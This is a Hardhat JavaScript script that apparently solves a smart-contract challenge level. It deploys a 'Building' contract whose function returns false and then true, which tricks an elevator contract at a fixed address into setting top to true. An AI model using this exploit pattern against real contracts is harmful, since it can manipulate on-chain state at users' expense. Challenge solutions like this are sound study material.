const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0x4DC3a7a579Af8Dd373283eD52B5aA5aaacd02D7e'
const abi = ["function top() external view returns (bool)"];

async function hack(contract, signer) {
    const Building = await ethers.getContractFactory("Building");
    const building = await Building.deploy(contract.address);
    await building.deployed();
    console.log("Building Deployed To:", building.address);

    // The elevator sets building address as caller, so needs to be initiated from Building contract.
    // The building logic ignores the floor and just returns true the second time it's called.
    const tx = await building.sendElevator();
    await tx.wait();

    const top = await contract.top();
    console.log("Did we get to the top?", top);
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})